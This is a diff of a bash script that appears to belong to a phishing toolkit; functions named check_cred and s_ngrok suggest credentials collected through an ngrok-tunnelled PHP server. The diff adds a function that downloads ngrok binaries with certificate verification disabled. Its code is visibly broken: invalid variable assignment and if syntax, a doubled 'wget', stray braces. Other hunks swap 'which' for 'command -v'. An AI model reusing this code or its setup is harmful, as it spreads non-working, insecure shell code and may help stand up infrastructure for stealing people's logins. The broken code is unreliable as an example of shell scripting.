@@ -48,6 +48,25 @@ check_cred(){
 	done
 }
 #End of user cred-------------------
+# make a function to download the ngrok 
+sys_arc(){
+	arc =$(uname -m)
+	if($arc == "Android" || $arc=="arm");then
+	{
+		wget wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+	}
+	elif($arc=="aarch64" || $arc =="x86_64");then
+	{
+		wget wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip
+	}
+	else{
+		wget wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
+	}
+	fi
+	}
+
+
+}
 #Make a server for handle ngrok request
 s_ngrok(){
 	echo -e " "
@@ -163,9 +182,9 @@ fi
 # Make a function for checking for requirements...---
 req_m(){
 	printf "${r}_______ ${p} checking for requirements ${r}_______\n"
-	which php 2>&1 > /dev/null || { echo -e "${g}+++++${y}Installing php${g}+++++" ; apt-get install php -y; }
-	which curl 2>&1 > /dev/null || { echo -e  "${g}+++++${y}Installing curl${g}+++++" ; apt-get install curl -y ; }
-        which unzip 2>&1 > /dev/null || { echo -e "${g}+++++${y}Installing unzip${g}+++++" ; apt-get install unzip -y ;}
+	command -v  php 2>&1 > /dev/null || { echo -e "${g}+++++${y}Installing php${g}+++++" ; apt-get install php -y; }
+	command -v curl 2>&1 > /dev/null || { echo -e  "${g}+++++${y}Installing curl${g}+++++" ; apt-get install curl -y ; }
+    command -v unzip 2>&1 > /dev/null || { echo -e "${g}+++++${y}Installing unzip${g}+++++" ; apt-get install unzip -y ;}
 	which wget 2>&1 > /dev/null || { echo -e "${g}+++++${y}Installing wget${g}+++++" ; apt-get install wget -y ; }
  }
 # calling req function
